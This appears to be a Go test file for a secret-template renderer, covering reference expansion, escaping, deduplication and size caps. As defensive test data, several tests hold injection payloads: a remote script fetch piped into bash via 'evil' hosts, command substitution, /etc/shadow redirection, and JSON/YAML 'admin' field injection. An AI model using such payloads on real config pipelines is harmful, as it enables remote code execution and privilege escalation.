package secrettemplate

import (
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"gopkg.in/yaml.v3"
)

// upper is a trivial resolver that echoes a value per ref, or errors on "missing".
// The marker is square brackets, not angle brackets: "<"/">" are now guarded shell
// redirection metacharacters (see TestRender_RejectsShellMetacharacters), so a real
// resolved value can't contain them — bracket markers keep this fixture distinguishable
// from literal template text without colliding with that guard.
func fakeResolve(ref string) (string, error) {
	if ref == "missing" {
		return "", errors.New("not found")
	}
	return "[" + ref + "]", nil
}

func TestRender_ExpandsReferences(t *testing.T) {
	out, err := Render("db=${secret:prod/db} api=${secret:prod/api}", fakeResolve)
	require.NoError(t, err)
	assert.Equal(t, "db=[prod/db] api=[prod/api]", out)
}

func TestRender_NoPlaceholders(t *testing.T) {
	out, err := Render("plain text, no refs, a lone $ and 100$ here", fakeResolve)
	require.NoError(t, err)
	assert.Equal(t, "plain text, no refs, a lone $ and 100$ here", out)
}

func TestRender_DollarEscape(t *testing.T) {
	// "$$" collapses to "$", so "$${secret:x}" is the literal "${secret:x}".
	out, err := Render("price=$$5 and $${secret:prod/db}", fakeResolve)
	require.NoError(t, err)
	assert.Equal(t, "price=$5 and ${secret:prod/db}", out)
}

func TestRender_TrimsRef(t *testing.T) {
	out, err := Render("${secret:  prod/db  }", fakeResolve)
	require.NoError(t, err)
	assert.Equal(t, "[prod/db]", out)
}

func TestRender_Errors(t *testing.T) {
	t.Run("unterminated", func(t *testing.T) {
		_, err := Render("oops ${secret:prod/db", fakeResolve)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "unterminated")
	})
	t.Run("empty ref", func(t *testing.T) {
		_, err := Render("${secret:}", fakeResolve)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "empty secret reference")
	})
	t.Run("resolver error names the ref", func(t *testing.T) {
		_, err := Render("x=${secret:missing}", fakeResolve)
		require.Error(t, err)
		assert.Contains(t, err.Error(), `resolve "missing"`)
	})
}

func TestRender_AdjacentAndRepeated(t *testing.T) {
	out, err := Render("${secret:a}${secret:a}${secret:b}", fakeResolve)
	require.NoError(t, err)
	assert.Equal(t, "[a][a][b]", out)
}

func TestReferences(t *testing.T) {
	refs, err := References("${secret:prod/db} then ${secret:prod/api} then ${secret:prod/db} again")
	require.NoError(t, err)
	assert.Equal(t, []string{"prod/db", "prod/api"}, refs, "distinct, first-seen order")
}

func TestReferences_PropagatesMalformed(t *testing.T) {
	_, err := References("${secret:unterminated")
	require.Error(t, err)
}

// A secret value with no embedded control characters — the overwhelmingly common case
// — must render byte-for-byte unchanged; the new injection guard must not alter or
// reject legitimate values.
func TestRender_PlainValueUnchanged(t *testing.T) {
	resolve := func(ref string) (string, error) {
		return "S3cr3t!Value-With.Punct_And Spaces", nil
	}
	out, err := Render("DB_PASSWORD=${secret:prod/db}", resolve)
	require.NoError(t, err)
	assert.Equal(t, "DB_PASSWORD=S3cr3t!Value-With.Punct_And Spaces", out)
}

// A secret value carrying an embedded newline, carriage return, or NUL byte must abort
// the render (matching Render's existing all-or-nothing failure model for a resolver
// error) rather than silently splicing extra lines/bytes into the output — this is the
// injection vector documented in #325: a low-trust secret-writer smuggling
// "\ncurl evil|bash\n#" into a rendered .env/config file that a downstream consumer may
// later source.
func TestRender_RejectsEmbeddedControlChars(t *testing.T) {
	cases := map[string]string{
		"newline":          "foo\ncurl http://evil/x.sh|bash\n#",
		"carriage return":  "foo\rbar",
		"crlf":             "foo\r\nbar",
		"NUL byte":         "foo\x00bar",
		"newline mid-word": "sk_live_abc\ndef",
	}
	for name, val := range cases {
		t.Run(name, func(t *testing.T) {
			resolve := func(ref string) (string, error) { return val, nil }
			_, err := Render("SECRET=${secret:prod/db}", resolve)
			require.Error(t, err)
			assert.Contains(t, err.Error(), `resolve "prod/db"`)
			assert.Contains(t, err.Error(), "cannot be safely substituted")
		})
	}
}

// A secret value carrying a shell metacharacter (backtick, ";", "|", "&", "<", ">", or a
// "$(" command-substitution opener) must abort the render, matching the newline/CR/NUL
// guard's all-or-nothing failure model. This closes the single-line variant of the
// bash-`source .env` RCE: unlike an embedded newline, none of these characters need a
// second line to take effect in an *unquoted* `KEY=value` assignment — the exact shape a
// rendered .env line takes — so the render must reject them just as eagerly.
func TestRender_RejectsShellMetacharacters(t *testing.T) {
	cases := map[string]string{
		"command substitution": "$(curl http://evil/x.sh|bash)",
		"backtick command":     "`curl http://evil/x.sh|bash`",
		"semicolon separator":  "foo; curl http://evil/x.sh|bash",
		"pipe":                 "foo|bash",
		"background ampersand": "foo & curl http://evil/x.sh|bash",
		"output redirection":   "foo>/etc/passwd",
		"input redirection":    "foo</etc/shadow",
	}
	for name, val := range cases {
		t.Run(name, func(t *testing.T) {
			resolve := func(ref string) (string, error) { return val, nil }
			_, err := Render("SECRET=${secret:prod/db}", resolve)
			require.Error(t, err)
			assert.Contains(t, err.Error(), `resolve "prod/db"`)
			assert.Contains(t, err.Error(), "cannot be safely substituted")
		})
	}
}

// The shell-metacharacter rejection must fire per-reference too: an earlier clean
// reference followed by a later poisoned one must still fail with no partial output.
func TestRender_RejectsShellMetacharacters_NoPartialOutput(t *testing.T) {
	resolve := func(ref string) (string, error) {
		if ref == "prod/clean" {
			return "cleanvalue", nil
		}
		return "$(curl evil|bash)", nil
	}
	out, err := Render("A=${secret:prod/clean} B=${secret:prod/dirty}", resolve)
	require.Error(t, err)
	assert.Empty(t, out)
}

// A secret value that legitimately contains a lone "$" (not part of "$(") must still
// render unchanged — the guard targets command substitution and separator syntax, not
// every dollar sign, since secret values (e.g. regex patterns, prices) may contain one
// without being dangerous in a sourced .env context.
func TestRender_AllowsLoneDollarSign(t *testing.T) {
	resolve := func(ref string) (string, error) { return "price=$5.00", nil }
	out, err := Render("VALUE=${secret:prod/price}", resolve)
	require.NoError(t, err)
	assert.Equal(t, "VALUE=price=$5.00", out)
}

// The rejection must fire per-reference: a template with an earlier clean reference and
// a later poisoned one must still fail (no partial output containing the clean value
// followed by a truncated/injected tail).
func TestRender_RejectsEmbeddedControlChars_NoPartialOutput(t *testing.T) {
	resolve := func(ref string) (string, error) {
		if ref == "prod/clean" {
			return "cleanvalue", nil
		}
		return "poison\nvalue", nil
	}
	out, err := Render("A=${secret:prod/clean} B=${secret:prod/dirty}", resolve)
	require.Error(t, err)
	assert.Empty(t, out)
}

// #443: a template that repeats the same reference many times must resolve it exactly
// once — not once per occurrence. This is both the DoS fix (a caller can't force
// N decryptions with N-1 of them wasted on byte-identical duplicates) and a
// correctness improvement (no reason to decrypt the same secret twice in one render).
func TestRender_DedupesRepeatedReferences(t *testing.T) {
	calls := map[string]int{}
	resolve := func(ref string) (string, error) {
		calls[ref]++
		return "[" + ref + "]", nil
	}

	var tmpl strings.Builder
	for range 5000 {
		fmt.Fprintf(&tmpl, "${secret:prod/db}")
	}
	out, err := Render(tmpl.String(), resolve)
	require.NoError(t, err)

	assert.Equal(t, 1, calls["prod/db"], "resolve must be called exactly once for 5000 occurrences of the same reference")
	assert.Equal(t, strings.Repeat("[prod/db]", 5000), out, "every occurrence still substitutes the resolved value")
}

// A template naming multiple distinct references, some of which repeat, must resolve
// each distinct reference exactly once while still substituting every occurrence
// correctly (interleaved duplicates, not just adjacent ones).
func TestRender_DedupesRepeatedReferences_MultipleDistinct(t *testing.T) {
	calls := map[string]int{}
	resolve := func(ref string) (string, error) {
		calls[ref]++
		return "[" + ref + "]", nil
	}

	tmpl := strings.Repeat("${secret:a}${secret:b}${secret:a}${secret:c}${secret:b}", 200)
	out, err := Render(tmpl, resolve)
	require.NoError(t, err)

	assert.Equal(t, 1, calls["a"])
	assert.Equal(t, 1, calls["b"])
	assert.Equal(t, 1, calls["c"])
	assert.Equal(t, strings.Repeat("[a][b][a][c][b]", 200), out)
}

// #443: even after dedup, a template naming more DISTINCT references than
// MaxDistinctReferences must be rejected outright — defense in depth against a
// template naming enough distinct secrets to still be a decryption/audit-log bomb
// despite the per-reference dedup.
func TestRender_RejectsTooManyDistinctReferences(t *testing.T) {
	calls := 0
	resolve := func(ref string) (string, error) {
		calls++
		return "x", nil
	}

	var tmpl strings.Builder
	for i := range MaxDistinctReferences + 1 {
		fmt.Fprintf(&tmpl, "${secret:ref-%d}", i)
	}
	out, err := Render(tmpl.String(), resolve)
	require.Error(t, err)
	assert.Empty(t, out)
	assert.Contains(t, err.Error(), fmt.Sprintf("%d", MaxDistinctReferences))
	assert.Equal(t, 0, calls, "the cap must be enforced before any resolver call, not partway through resolution")
}

// A template naming exactly MaxDistinctReferences distinct references — the boundary —
// must still be accepted and render correctly.
func TestRender_AllowsExactlyMaxDistinctReferences(t *testing.T) {
	resolve := func(ref string) (string, error) { return "[" + ref + "]", nil }

	var tmpl strings.Builder
	var want strings.Builder
	for i := range MaxDistinctReferences {
		fmt.Fprintf(&tmpl, "${secret:ref-%d}", i)
		fmt.Fprintf(&want, "[ref-%d]", i)
	}
	out, err := Render(tmpl.String(), resolve)
	require.NoError(t, err)
	assert.Equal(t, want.String(), out)
}

// A normal, reasonably-sized template with a handful of distinct references (well
// under the cap, no duplicates) renders exactly as before this change.
func TestRender_NormalTemplateUnaffected(t *testing.T) {
	resolve := func(ref string) (string, error) { return "[" + ref + "]", nil }
	out, err := Render("host=${secret:prod/host} user=${secret:prod/user} pass=${secret:prod/pass}", resolve)
	require.NoError(t, err)
	assert.Equal(t, "host=[prod/host] user=[prod/user] pass=[prod/pass]", out)
}

// References() must respect the same distinct-reference cap as Render, since it shares
// the same parse pass.
func TestReferences_RejectsTooManyDistinctReferences(t *testing.T) {
	var tmpl strings.Builder
	for i := range MaxDistinctReferences + 1 {
		fmt.Fprintf(&tmpl, "${secret:ref-%d}", i)
	}
	_, err := References(tmpl.String())
	require.Error(t, err)
}

// RenderWithOptions(tmpl, resolve, RenderOptions{}) — the zero value — must render
// byte-for-byte identically to Render, and Render itself must be unaffected by the
// existence of RenderOptions/RenderWithOptions. This is the "additive only, no
// default-behavior change" guarantee the escaping option depends on.
func TestRenderWithOptions_ZeroValueMatchesRender(t *testing.T) {
	tmpl := "host=${secret:prod/host} user=${secret:prod/user} pass=${secret:prod/pass}"
	resolve := func(ref string) (string, error) { return "[" + ref + "]", nil }

	want, err := Render(tmpl, resolve)
	require.NoError(t, err)

	got, err := RenderWithOptions(tmpl, resolve, RenderOptions{})
	require.NoError(t, err)

	assert.Equal(t, want, got)
}

// EscapeJSONString must produce content that, wrapped in a pair of double quotes,
// round-trips back to the exact original value when parsed as a JSON string — for
// values containing quotes, backslashes, control characters (including newlines),
// and characters (like ':') that are JSON-significant in other contexts but not
// inside a string.
func TestEscapeJSONString_RoundTrips(t *testing.T) {
	cases := map[string]string{
		"double quote":           `x"y`,
		"backslash":              `x\y`,
		"quote and backslash":    `x\"y`,
		"newline":                "x\ny",
		"crlf":                   "x\r\ny",
		"tab":                    "x\ty",
		"colon":                  "x:y",
		"json injection payload": `x", "admin": true, "x":"`,
		"unicode":                "snowman ☃ emoji \U0001F600",
	}
	for name, val := range cases {
		t.Run(name, func(t *testing.T) {
			escaped := EscapeJSONString(val)
			wrapped := `"` + escaped + `"`
			require.True(t, json.Valid([]byte(wrapped)), "escaped value wrapped in quotes must be a valid JSON string literal: %q", wrapped)
			var got string
			require.NoError(t, json.Unmarshal([]byte(wrapped), &got))
			assert.Equal(t, val, got, "round-tripping the escaped value through a JSON string must reproduce the original")
		})
	}
}

// EscapeYAMLString must produce content that, wrapped in a pair of double quotes,
// round-trips back to the exact original value when parsed as a YAML double-quoted
// scalar — mirroring TestEscapeJSONString_RoundTrips for YAML.
func TestEscapeYAMLString_RoundTrips(t *testing.T) {
	cases := map[string]string{
		"double quote":           `x"y`,
		"backslash":              `x\y`,
		"quote and backslash":    `x\"y`,
		"newline":                "x\ny",
		"crlf":                   "x\r\ny",
		"tab":                    "x\ty",
		"colon":                  "x: y",
		"yaml injection payload": "x\"\nadmin: true\nx: \"",
		"unicode":                "snowman ☃ emoji \U0001F600",
	}
	for name, val := range cases {
		t.Run(name, func(t *testing.T) {
			escaped := EscapeYAMLString(val)
			wrapped := `"` + escaped + `"`
			var got string
			require.NoError(t, yaml.Unmarshal([]byte(wrapped), &got), "escaped value wrapped in quotes must parse as a valid YAML double-quoted scalar: %q", wrapped)
			assert.Equal(t, val, got, "round-tripping the escaped value through a YAML double-quoted scalar must reproduce the original")
		})
	}
}

// This is the exact exploit scenario from the finding: a template building a JSON
// document around a placeholder (`{"password": "${secret:...}"}`), and a lower-trust
// secret-writer setting the value to a payload designed to close the "password"
// string early and inject a sibling "admin" field. First prove the vulnerability is
// real for the default, raw Render (documenting exactly why RenderJSON exists), then
// prove RenderJSON neutralizes it: the payload lands intact as the "password" value
// and no "admin" field is injected.
func TestRenderJSON_NeutralizesJSONFieldInjection(t *testing.T) {
	const payload = `x", "admin": true, "x":"`
	resolve := func(ref string) (string, error) { return payload, nil }
	tmpl := `{"password": "${secret:prod/db}"}`

	// Sanity check: raw Render's substitution is naive text splicing, so this
	// crafted payload happens to produce syntactically valid JSON with an injected
	// "admin" field — demonstrating the vulnerability RenderJSON exists to close.
	raw, err := Render(tmpl, resolve)
	require.NoError(t, err)
	var rawParsed map[string]any
	require.NoError(t, json.Unmarshal([]byte(raw), &rawParsed), "raw output: %s", raw)
	assert.Equal(t, true, rawParsed["admin"], "raw Render's substitution let the secret value inject an unrelated admin field")
	assert.NotEqual(t, payload, rawParsed["password"], "raw Render's password field was truncated by the injected quote, not left intact")

	// The fix: RenderJSON escapes the value before substitution, so it can't break
	// out of the "password" string field at all.
	out, err := RenderJSON(tmpl, resolve)
	require.NoError(t, err)
	var parsed map[string]any
	require.NoError(t, json.Unmarshal([]byte(out), &parsed), "RenderJSON output: %s", out)
	assert.Equal(t, payload, parsed["password"], "RenderJSON must preserve the secret value exactly, as the password field's content")
	_, hasAdmin := parsed["admin"]
	assert.False(t, hasAdmin, "RenderJSON must not allow the secret value to inject a sibling admin field")
}

// Same scenario as TestRenderJSON_NeutralizesJSONFieldInjection, but for a template
// that builds a YAML flow-style mapping (YAML's flow style is close enough to JSON
// syntax that the same quote-breakout shape applies) around a placeholder.
func TestRenderYAML_NeutralizesFlowMappingInjection(t *testing.T) {
	const payload = `x", "admin": true, "x":"`
	resolve := func(ref string) (string, error) { return payload, nil }
	tmpl := `{"password": "${secret:prod/db}"}`

	raw, err := Render(tmpl, resolve)
	require.NoError(t, err)
	var rawParsed map[string]any
	require.NoError(t, yaml.Unmarshal([]byte(raw), &rawParsed), "raw output: %s", raw)
	assert.Equal(t, true, rawParsed["admin"], "raw Render's substitution let the secret value inject an unrelated admin field")

	out, err := RenderYAML(tmpl, resolve)
	require.NoError(t, err)
	var parsed map[string]any
	require.NoError(t, yaml.Unmarshal([]byte(out), &parsed), "RenderYAML output: %s", out)
	assert.Equal(t, payload, parsed["password"], "RenderYAML must preserve the secret value exactly, as the password field's content")
	_, hasAdmin := parsed["admin"]
	assert.False(t, hasAdmin, "RenderYAML must not allow the secret value to inject a sibling admin field")
}

// RenderJSON/RenderYAML must still enforce the SAME newline/CR/NUL and
// shell-metacharacter guards Render does — escaping only changes how a value that
// already passed those guards is embedded in the output, it does not loosen what's
// accepted in the first place (see RenderWithOptions/EscapeFunc doc comments).
func TestRenderJSON_StillRejectsControlCharsAndShellMetacharacters(t *testing.T) {
	t.Run("newline still rejected", func(t *testing.T) {
		resolve := func(ref string) (string, error) { return "foo\nbar", nil }
		_, err := RenderJSON(`{"x": "${secret:prod/db}"}`, resolve)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "cannot be safely substituted")
	})
	t.Run("shell metacharacter still rejected", func(t *testing.T) {
		resolve := func(ref string) (string, error) { return "$(curl evil|bash)", nil }
		_, err := RenderJSON(`{"x": "${secret:prod/db}"}`, resolve)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "cannot be safely substituted")
	})
}

// A plain value with no format-significant characters must render identically
// through RenderJSON/RenderYAML as through Render — escaping must be a no-op for the
// overwhelmingly common case, not just "safe" in the adversarial one.
func TestRenderJSON_PlainValueUnaffectedByEscaping(t *testing.T) {
	resolve := func(ref string) (string, error) { return "S3cr3t-Value_123", nil }
	tmpl := `{"password": "${secret:prod/db}"}`

	want, err := Render(tmpl, resolve)
	require.NoError(t, err)
	got, err := RenderJSON(tmpl, resolve)
	require.NoError(t, err)
	assert.Equal(t, want, got)
}

// EscapeYAMLString must fall back to its defensive replacer when yaml.v3 doesn't
// encode the value as a plain double-quoted scalar: a value containing invalid
// UTF-8 makes yaml.Marshal emit a `!!binary "...."` tagged scalar instead (since a
// double-quoted style can't represent arbitrary binary), so the function's
// quote-stripping fast path (which assumes the marshaled form starts and ends with
// a bare `"`) doesn't apply. The fallback must still escape the *original* value's
// quotes/backslashes rather than leak yaml.Marshal's `!!binary` tag or base64 body
// into the caller's output.
func TestEscapeYAMLString_FallsBackOnInvalidUTF8(t *testing.T) {
	// Invalid UTF-8 byte combined with a quote and a backslash in the same value,
	// so the assertion exercises the replacer's actual escaping behavior rather
	// than merely "value passed through unchanged".
	val := "\xc3(\"back\\slash"

	got := EscapeYAMLString(val)

	want := strings.NewReplacer(`\`, `\\`, `"`, `\"`).Replace(val)
	assert.Equal(t, want, got, "fallback must escape the original value's quotes/backslashes")
	assert.NotContains(t, got, "!!binary", "must not leak yaml.Marshal's !!binary tag into the escaped output")
}

// RenderWithOptions must cap total rendered output at MaxOutputBytes: a resolved
// value large enough on its own to push the cumulative output past the cap must
// abort the render with an error naming the byte limit, rather than allow Render
// to be used as a memory-exhaustion amplifier (see MaxOutputBytes doc comment).
func TestRender_RejectsOutputExceedingMaxBytes(t *testing.T) {
	huge := strings.Repeat("a", MaxOutputBytes+1)
	resolve := func(ref string) (string, error) { return huge, nil }

	out, err := Render("${secret:prod/db}", resolve)
	require.Error(t, err)
	assert.Empty(t, out, "no partial output on a size-limit abort")
	assert.Contains(t, err.Error(), fmt.Sprintf("%d", MaxOutputBytes))
	assert.Contains(t, err.Error(), "exceeds")
}

// A rendered output of exactly MaxOutputBytes (the boundary, not over it) must
// still succeed — the cap rejects output that exceeds the limit, not output that
// merely reaches it.
func TestRender_AllowsOutputAtExactlyMaxBytes(t *testing.T) {
	exact := strings.Repeat("a", MaxOutputBytes)
	resolve := func(ref string) (string, error) { return exact, nil }

	out, err := Render("${secret:prod/db}", resolve)
	require.NoError(t, err)
	assert.Equal(t, exact, out)
}

// The MaxOutputBytes cap must also fire when no single resolved value is oversized
// on its own, but several distinct references' values (plus literal text) sum past
// the cap across multiple segments — the check runs after every segment write, not
// just once at the end, so a template with many moderate-sized references can't
// evade the cap by never naming one giant value.
func TestRender_RejectsOutputExceedingMaxBytes_AccumulatedAcrossSegments(t *testing.T) {
	const chunk = MaxOutputBytes / 4
	value := strings.Repeat("a", chunk+1) // 4 refs * (chunk+1) > MaxOutputBytes
	resolve := func(ref string) (string, error) { return value, nil }

	tmpl := "${secret:a}${secret:b}${secret:c}${secret:d}"
	out, err := Render(tmpl, resolve)
	require.Error(t, err)
	assert.Empty(t, out, "no partial output on a size-limit abort")
	assert.Contains(t, err.Error(), fmt.Sprintf("%d", MaxOutputBytes))
	assert.Contains(t, err.Error(), "exceeds")
}

// The accumulation check must not misfire early: a template whose several segments
// sum to exactly MaxOutputBytes (never exceeding it at any intermediate step) must
// still succeed, mirroring TestRender_AllowsOutputAtExactlyMaxBytes for the
// multi-segment case.
func TestRender_AllowsOutputAtExactlyMaxBytes_AccumulatedAcrossSegments(t *testing.T) {
	const chunk = MaxOutputBytes / 4
	value := strings.Repeat("a", chunk)
	resolve := func(ref string) (string, error) { return value, nil }

	tmpl := "${secret:a}${secret:b}${secret:c}${secret:d}"
	out, err := Render(tmpl, resolve)
	require.NoError(t, err)
	assert.Equal(t, strings.Repeat(value, 4), out)
	assert.Len(t, out, MaxOutputBytes)
}
